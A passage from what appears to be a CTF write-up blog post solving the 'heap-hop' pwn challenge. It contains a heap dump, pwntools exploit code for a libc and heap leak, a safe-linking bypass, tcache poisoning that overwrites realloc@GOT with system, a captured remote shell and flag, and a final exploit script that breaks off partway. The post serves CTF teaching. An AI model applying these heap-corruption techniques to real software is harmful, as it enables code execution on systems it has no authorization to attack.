0x1d835d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835e0       0x0000000000000410      0x0000000000000040      ........@.......        &lt;<span class="o">=</span> Freed chunk <span class="m">11</span>
0x1d835f0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83600       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83610       0x0000000000000200      0x0000000001d83170      ........p1......                                                                               
0x1d83620       0x0000000000000000      0x0000000000000211      ................                                                                               
0x1d83630       0x0000000000001d83      0x5b5e1382ca86a7f8      ..............^<span class="o">[</span>        &lt;-- tcachebins<span class="o">[</span>0x210<span class="o">][</span>0/1<span class="o">]</span>                                             
0x1d83640       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83650       0x0000000000000000      0x0000000000000000      ................                             
0x1d83660       0x0000000000000000      0x0000000000000000      ................                             
0x1d83670       0x0000000000000000      0x0000000000000000      ................                             
0x1d83680       0x0000000000000000      0x0000000000000000      ................                             
0x1d83690       0x0000000000000000      0x0000000000000000      ................                             
0x1d836a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83700       0x0000000000000000      0x0000000000000000      ................                             
0x1d83710       0x0000000000000000      0x0000000000000000      ................                             
0x1d83720       0x0000000000000000      0x0000000000000000      ................                             
0x1d83730       0x0000000000000000      0x0000000000000000      ................                             
0x1d83740       0x0000000000000000      0x0000000000000000      ................                             
0x1d83750       0x0000000000000000      0x0000000000000000      ................                             
0x1d83760       0x0000000000000000      0x0000000000000000      ................                             
0x1d83770       0x0000000000000000      0x0000000000000000      ................                             
0x1d83780       0x0000000000000000      0x0000000000000000      ................                             
0x1d83790       0x0000000000000000      0x0000000000000000      ................                             
0x1d837a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83800       0x0000000000000000      0x0000000000000000      ................                             
0x1d83810       0x0000000000000000      0x0000000000000000      ................                             
0x1d83820       0x0000000000000000      0x0000000000000000      ................                             
0x1d83830       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> last small chunk, barreer               
0x1d83840       0x000000000000000a      0x0000000000000000      ................                             
0x1d83850       0x0000000000000000      0x0000000000000000      ................                             
0x1d83860       0x0000000000000020      0x0000000001d83880       ........8......                             
0x1d83870       0x0000000000000000      0x0000000000000031      ........1.......                             
0x1d83880       0x00000000000a3233      0x0000000000000000      32..............                             
0x1d83890       0x0000000000000000      0x0000000000000000      ................                             
0x1d838a0       0x0000000000000000      0x000000000001e761      ........a.......        &lt;-- Top chunk        
</code></pre></div><p>I advice you to take a look at the heap layout if you do not understand the exploit script.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="heap-leak">
        Heap leak
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap leak" href="#heap-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Now we got a libc leak we&rsquo;re looking for a heap leak, it is basically the same thing as above, but instead of freeing a large chunk, we free a small <code>0x20</code> sized chunk. To understand the defeat of safe-linking I advice you to read <a
  class="gblog-markdown__link"
  href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation"
  
  >this</a
>. Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># leak heap to craft pointers</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span> <span class="c1"># split unsortedbin chunk</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># tcache 0x20</span>

<span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span> <span class="c1"># leak fp of 1</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="tcache-poisoning">
        tcache poisoning
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#tcache-poisoning" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor tcache poisoning" href="#tcache-poisoning">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To achieve tcache poisoning we just need to get the <code>0x20</code> sized chunk right after the out of bound chunk. Then we free it and we use the out of bound chunk to overwrite the forward pointer of the victim chunk to <code>&amp;realloc@GOT</code>. Given we leaked the heap we can easily bypass the safe-linking protection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1">#== tcache poisoning</span>

<span class="c1"># get the 0x20 sized chunk that is right after the oob chunk</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
<span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 

<span class="c1"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x21f0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">realloc</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)))</span> 

<span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span> <span class="c1"># useless</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

<span class="c1"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">scanf</span><span class="p">))</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Then we just have to do:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>Which gives:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/pwnme/heap$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1336
[*] '/home/nasm/Documents/pwn/pwnme/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
[*] '/home/nasm/Documents/pwn/pwnme/heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 51.254.39.184 on port 1336: Done
[*] libc: 0x7faf9a27f000
[*] heap: 0x191d000
[*] one_gadget: 0x7faf9a36acf8 @ 0x404050
[*] Switching to interactive mode
$ id
uid=1000(player) gid=999(ctf) groups=999(ctf)
$ ls
flag.txt
run
$ cat flag.txt
PWNME{d1d_y0u_kn0w_r341l0c_c4n_b3h4v3_l1k3_th4t}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here is the final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;heap-hop&#34;</span>
<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/pwnme/heap/libc.so.6&#34;</span>
<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2&#34;</span>

<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="k">def</span> <span class="nf">one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
  <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="s1">&#39;--raw&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)]</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>

    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">trackLen</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">trackLen</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">trackLen</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;[+] track content :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">newLength</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">newLength</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
    
    <span class="c1"># Step one, 7 chunks to fill tcache later</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="c1"># small chunk which will be used to the oob r/w</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>
    <span class="c1"># victim chunk</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>

    <span class="c1"># chunk with big size that will be used for the oob r/w</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barreer&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barree2&#34;</span><span class="p">)</span>

    <span class="c1"># fill tcache</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>

    <span class="c1"># oob chunk </span>
    <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span> <span class="c1"># allocated in 9</span>
    
    <span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># falls in the unsortedbin</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># leak libc</span>

    <span class="c1"># leak heap to craft pointers</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span> <span class="c1"># split unsortedbin chunk</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># tcache 0x20</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
